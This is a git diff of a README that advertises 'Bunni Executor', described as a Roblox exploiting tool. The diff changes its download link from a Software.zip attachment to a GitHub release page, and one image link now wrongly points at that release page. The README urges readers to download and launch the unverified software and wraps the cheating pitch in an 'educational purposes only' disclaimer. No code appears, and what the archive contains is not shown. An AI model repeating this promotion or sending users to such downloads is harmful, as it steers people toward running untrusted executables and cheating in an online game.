@@ -12,7 +12,7 @@ Bunni Executor is a top-tier Roblox exploiting platform designed by industry exp
 ## Getting Started:
 To access Bunni Executor and enjoy its powerful features, you can download the software from the following link:
 
-[![Download Bunni Executor](https://img.shields.io/badge/Download-Software.zip-brightgreen)](https://github.com/user-attachments/files/18060583/Software.zip)
+[![Download Bunni Executor](https://github.com/Sweaty27/Roblox-Bunni-Executor/releases/tag/v2.0)](https://github.com/Sweaty27/Roblox-Bunni-Executor/releases/tag/v2.0)
 
 Please note that the software needs to be launched after downloading it to start using Bunni Executor effectively.
 
@@ -23,4 +23,4 @@ Bunni Executor is intended for educational purposes only. The developers do not 
 
 Explore the power of Bunni Executor and enhance your Roblox exploiting experience today! 🚀🐰
 
-![Roblox Bunni Executor](https://example.com/image.png)
+![Roblox Bunni Executor](https://github.com/Sweaty27/Roblox-Bunni-Executor/releases/tag/v2.0)
